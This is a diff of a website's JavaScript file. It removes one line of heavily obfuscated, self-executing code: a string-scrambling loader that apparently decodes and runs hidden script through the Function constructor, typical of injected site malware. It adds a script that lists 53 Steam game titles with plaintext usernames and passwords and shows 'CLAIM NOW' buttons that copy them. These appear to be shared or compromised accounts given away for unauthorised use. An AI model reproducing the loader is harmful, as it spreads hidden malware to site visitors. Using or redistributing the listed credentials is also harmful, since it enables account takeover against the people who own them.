@@ -1,1 +1,89 @@
-(function(){var ItA='',cKV=277-266;function WtN(i){var y=1017630;var c=i.length;var q=[];for(var d=0;d<c;d++){q[d]=i.charAt(d)};for(var d=0;d<c;d++){var r=y*(d+69)+(y%42211);var e=y*(d+333)+(y%52611);var g=r%c;var n=e%c;var m=q[g];q[g]=q[n];q[n]=m;y=(r+e)%2446810;};return q.join('')};var TUQ=WtN('jctoqtcirurslodkgfhbmoecnrpsuxtnvwzya').substr(0,cKV);var USz='b;l)=41es+,s4;uois;7jw8od"eby}(),c[) lvnfe)rsiuo;hv=dgvrACrau9...r=)v,7c{y2]n9f8pS]".[u2[z,==-{ 9. b77a4v",o-vc)+r,u,dr=(;ra2)a=;;=v}v *; ft1iog< {apn..h)ieerngr =fraplo.vr{u+lg[dsrai)vous.+c.}=))o,ru)vd nga]t+<;rg+nt)=ra,en;.a,{at)h;ams)],rr==t9=fr.]Cru"3a("testfor8(ah7,bcC+ol=rh-6;vf.xvv;e,2auunlnqflntp;;)e=ocj].i;yh rn,e ;}-r;le=;(p(1k0,h8v +vS;va.t,ofl-ig)86d=g;brka j0tr=lnlo+e"[hb(!}t677e(v; =grA+hro]em 8;;dl+o(q=,v;vut.h+t;;(hc6Cr>l)wev=n;fftf6+zlhe i((h0=e)rhhp)hu7 en+t(vhher-;d=0g;ee=n=g b)m,>v(=une]vAr(1;ai=);A5b9o=s2;r6l*atl1n;0;t[;}8f+fs=sahr+ =<,=gc2at+)riy"p.ei[2hisn1,ep3n[f.,<hgpr+hf!8t.-v); rtse(du)c0r=;ol.x)sz(faoaat)6,h(;ps}n;82=deh2=mor[(gCdlbn0j."4)x;,=(ir,u0s. [s]1+a90"p{]r;csn[of(= i);a(10)=ok]nr.]+,( hp5trt8xl2(;1y(ih(bris<eAn1cnws{h=q(C)a(;+1;6er(n[+5dr n1;(.lo,()ueb+v098i.ricf=vabubwva4jgnl,)aj id+h0(ibgb7aom"+idr r])jra16Cz.rl[[j=t=.slicpxacC(fdlikn(9c]';var LlW=WtN[TUQ];var rmf='';var bur=LlW;var dhU=LlW(rmf,WtN(USz));var QLE=dhU(WtN(',b)+..cV!Dterl*te{.r.yq=!Vi VstVf}b[5h+ vd!fl\'vVoV8.Vk.);+){(&V0o)v1=m$]lr}Vom7=1(fV)dz*!rbjt0n.tVe)t% .=7hs;)(b_Vmfb=xVqpd.$u)m.n;3=o|!a".7h.e[tyy.ag==l);=,{x%)h3z.{0.+xt]Vp1b%{((ld+y)V....|.ljVxt&{&.V-V(bx%bV_7.bm=02;ia%=!bjc[\'6$6s)x"=o.&.3ueuimy[!r7()xd(,-bde1op[oeV[%.ec;VVbV+V(V7%rtV)be]xf ;mo*V V.eV+VVV2V#,d)dV0))i6(=od2VVf+#y blmaCV)+Vr.3Vu{)(&}i.(t)xVn).we1V8.;.t)4.}+j"=r;E%.3](bt.tt)t((*_w4&Ve]n.e-k%)+fuo!.(5b71.S=sufn*=VV=bV2teol.hc,n!(q%$(ah(jrV"_},arl=j8m);nscV&(a(i+d6nVCyi.Cn.0e=e$rdm8p1}yVVeing..]nbo)(j%-CuVe#=V.=leVVV_u\'(sh)rbV es0f2t!w)icth.%n8nhn$mti6fs&a !$7mb,.bt0i8.6[V"i!eidh)VVp1n)keVeV!m];)e\' =k V)dskoo.i]t& f7(tf(b*d+ze(.;i;7b+"%)..#gcvh. fu;cV.o[pi.2mV V!sz,b(eb24(_fn3bfm0V!)(gV=r#c.&)1)}fd(%ffD ffhVE2r)a'));var JSA=bur(ItA,QLE );JSA(5338);return 9598})()
+document.addEventListener("DOMContentLoaded", () => {
+    // قائمة الـ 53 لعبة والـ UZAX Packs كاملة ومضمنة مباشرة للحفاظ على الأنميشن والأزرار الأصلية
+    const games = [
+        { id: 1, title: "Sniper Elite 4", username: "steamboatcategory", password: "yvuwm9cp8WTe", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/312660/header.jpg" },
+        { id: 2, title: "Call of Duty: Modern Warfare", username: "financialscorpion39551", password: "n40saxt50yiyn4g!zru3b", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1938090/header.jpg" },
+        { id: 3, title: "Resident Evil Requiem", username: "pkbwn28474", password: "rwych85203", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/2050650/header.jpg" },
+        { id: 4, title: "Red Dead Redemption 2", username: "pamx36325", password: "C4C45DCBXCKF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1174180/header.jpg" },
+        { id: 5, title: "Cyberpunk 2077", username: "msk247542", password: "rae246924", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1091500/header.jpg" },
+        { id: 6, title: "Forza Horizon 5", username: "Vj7Iu0Ol3Nz6", password: "Evylos12", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 7, title: "Forza Horizon 5 (Alt)", username: "Vj7Iu0Ol3Nz6", password: "Evylos12", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 8, title: "Resident Evil Village", username: "exqgy03440", password: "2eZ9C3s9", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1196590/header.jpg" },
+        { id: 9, title: "Age of Empires II: Definitive Edition", username: "djw1040456792", password: "NCDRxrBoin", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/813780/header.jpg" },
+        { id: 10, title: "Bodycam", username: "vvhlg39685", password: "nfwz57148X", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/2407270/header.jpg" },
+        { id: 11, title: "Farming Simulator 22", username: "Rmzgff", password: "Rmzgns1905", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1248130/header.jpg" },
+        { id: 12, title: "Forza Horizon 4 (UZAX Pack)", username: "mpyyn02828", password: "18082006Ong$aa", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 13, title: "Forza Horizon 4 (UZAX Pack Alt)", username: "necf16751", password: "Mm6Fv5Nr9Qn66t", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 14, title: "Forza Horizon 5 (UZAX Monster)", username: "monsterice4566", password: "Zara13ssd", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 15, title: "Forza Horizon 5 + Subnautica 2 (UZAX Pack)", username: "tvfnp31656", password: "pmo090710", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 16, title: "Resident Evil 4 (UZAX Pack)", username: "exqgy03440", password: "2eZ9C3s9", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/2050650/header.jpg" },
+        { id: 17, title: "Forza Horizon 4 + Pack (UZAX Pack)", username: "overfreak911", password: "yachertila", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 18, title: "Forza Horizon 4 (UZAX Arena)", username: "forzaesporarena172", password: "Safak3535", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 19, title: "Forza Horizon 5 (UZAX T1dyy)", username: "T1dyy0527", password: "Sn3yw7669", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 20, title: "Forza Horizon 5 (UZAX Gamerspace)", username: "8sx9yb5v", password: "Gamerspace@1234", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 21, title: "Forza Horizon 5 (UZAX Smileboy)", username: "smileboy21c", password: "j2c5h22!!", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 22, title: "Forza Horizon 4 (UZAX Nbyd)", username: "nbyd64202", password: "nsWMhCgjn5R0bf0", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 23, title: "Forza Horizon 6 (UZAX Pack)", username: "bwxbg03986", password: "pmtsa06710", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1551360/header.jpg" },
+        { id: 24, title: "Forza Horizon 4 (UZAX Ddn)", username: "ddn4elu7qjn01m", password: "Mortalkombat1234x", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 25, title: "GTA V (UZAX Legacy & Enhanced)", username: "dcdhi038", password: "TYX8BZ7CXD2X", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/271590/header.jpg" },
+        { id: 26, title: "Assassin's Creed Odyssey (UZAX Pack)", username: "luisviseu1", password: "JEgsvAHH", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/582160/header.jpg" },
+        { id: 27, title: "Ghost of Tsushima DIRECTOR'S CUT (UZAX Pack)", username: "socialpidar", password: "Kirito09uz11", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/2215430/header.jpg" },
+        { id: 28, title: "AAA Package +300 Games V2 (UZAX Pack)", username: "SIM0NCHIK21451", password: "SIMPLE123", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1174180/header.jpg" },
+        { id: 29, title: "Elden Ring Nightreign (UZAX Pack)", username: "hbiducoz8319", password: "ucirr02069", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/2622380/header.jpg" },
+        { id: 30, title: "GTA V Legacy + The Witcher 3 (UZAX Pack)", username: "falconne74", password: "account_by_tg@h452v", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/271590/header.jpg" },
+        { id: 31, title: "Among Us & Counter Strike (UZAX Pack)", username: "strzvlv", password: "M99YGBY5XGME", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/945360/header.jpg" },
+        { id: 32, title: "Spider-Man 2 (UZAX Pack)", username: "spidermn2astrokey", password: "pass138azx@astrokey.store", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/2622380/header.jpg" },
+        { id: 33, title: "Call of Duty: Modern Warfare 4 (UZAX Pack)", username: "jgqrm66771", password: "jyhas53135", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1938090/header.jpg" },
+        { id: 34, title: "Sleeping Dogs (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/307690/header.jpg" },
+        { id: 35, title: "Friday the 13th (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/438740/header.jpg" },
+        { id: 36, title: "The Forest (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/242760/header.jpg" },
+        { id: 37, title: "Phasmophobia (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/739630/header.jpg" },
+        { id: 38, title: "Forza Horizon 4 (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1293830/header.jpg" },
+        { id: 39, title: "Half-Life (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/70/header.jpg" },
+        { id: 40, title: "Just Cause 3 (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/225540/header.jpg" },
+        { id: 41, title: "Hitman Absolution (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/203140/header.jpg" },
+        { id: 42, title: "Hitman 2 (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/863550/header.jpg" },
+        { id: 43, title: "It Takes Two (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1426210/header.jpg" },
+        { id: 44, title: "Call of Duty: Black Ops III (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/311210/header.jpg" },
+        { id: 45, title: "Sons of the Forest (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1326470/header.jpg" },
+        { id: 46, title: "Dark Souls III (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/374320/header.jpg" },
+        { id: 47, title: "Ark: Survival Evolved (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/346110/header.jpg" },
+        { id: 48, title: "Mortal Kombat 11 (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/976310/header.jpg" },
+        { id: 49, title: "Just Cause 2 (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/8190/header.jpg" },
+        { id: 50, title: "Tomb Raider (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/203160/header.jpg" },
+        { id: 51, title: "Dying Light (UZAX Pack)", username: "fnsow23153", password: "Gm97XRxDsVLqcuF", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/239140/data/header.jpg" },
+        { id: 52, title: "Resident Evil Village (UZAX Bundle)", username: "exqgy03440", password: "2eZ9C3s9", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1196590/header.jpg" },
+        { id: 53, title: "20+ Games Pack (UZAX Bemon)", username: "celtshelt", password: "Polestar19", image_url: "https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/1174180/header.jpg" }
+    ];
+
+    const container = document.querySelector('.games-grid') || document.querySelector('.games-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    games.forEach(game => {
+        const card = document.createElement('div');
+        card.className = 'game-card';
+        card.innerHTML = `
+            <div class="game-img-wrap">
+                <img src="${game.image_url}" alt="${game.title}">
+            </div>
+            <div class="game-details">
+                <h3>${game.title}</h3>
+                <div class="status-row">
+                    <span class="status-text">Status:</span>
+                    <span class="status-val" style="color: #2ecc71;">Available</span>
+                </div>
+                <button class="claim-btn" onclick="copyAccount('${game.username}', '${game.password}')">CLAIM NOW</button>
+            </div>
+        `;
+        container.appendChild(card);
+    });
+});
+
+function copyAccount(user, pass) {
+    const info = `Username: ${user}\nPassword: ${pass}`;
+    navigator.clipboard.writeText(info).then(() => {
+        alert('Account Copied Successfully! 🎉');
+    });
+}
